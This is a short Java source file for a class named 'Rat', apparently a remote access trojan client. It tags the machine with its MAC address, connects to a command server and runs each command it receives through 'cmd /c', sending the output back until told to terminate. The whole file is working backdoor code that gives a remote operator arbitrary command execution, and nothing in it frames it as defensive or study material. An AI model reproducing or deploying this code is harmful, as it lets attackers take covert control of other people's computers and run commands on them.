package main;

import java.io.*;
import java.net.*;

class Rat {
    private static final String SERVER_ADDRESS = "localhost";
    private static final int SERVER_PORT = 7845;
    static String username;

    static {
        try {
            username = getMACAddress();
        } catch (UnknownHostException | SocketException e) {
            e.printStackTrace();
        }
    }

    Rat() throws SocketException, UnknownHostException {
    }

    private static String getMACAddress() throws UnknownHostException, SocketException {
        InetAddress localHost = InetAddress.getLocalHost();
        NetworkInterface ni = NetworkInterface.getByInetAddress(localHost);
        byte[] hardwareAddress = ni.getHardwareAddress();
        String[] hexadecimal = new String[hardwareAddress.length];
        for (int i = 0; i < hardwareAddress.length; i++) {
            hexadecimal[i] = String.format("%02X", hardwareAddress[i]);
        }
        return String.join("-", hexadecimal);
    }

    public static void main(String[] args) {
        try {
            Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
            System.out.println("Connected to server!");

            // Setting up input and output streams
            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            out.println(username);

            boolean exitFlag = true;
            // Start a thread to handle incoming commands
            while(exitFlag){
                try {
                    String serverCommand;
                    while ((serverCommand = in.readLine()) != null) {
                        if (serverCommand.equals("TERMINATE")){
                            exitFlag = false; break;
                        }
                        System.out.println("command \"" + serverCommand + "\" received.");
                        Process proc = Runtime.getRuntime().exec("cmd" + " /c " + serverCommand);
                        out.println("command \"" + serverCommand + "\" executed by " + username + ".");
                        BufferedReader log = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                        String line = "";
                        while ((line = log.readLine()) != null) out.println(line + "\n");
                        proc.waitFor();
                    }
                } catch (IOException | InterruptedException e) {
                    e.printStackTrace();
                }
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

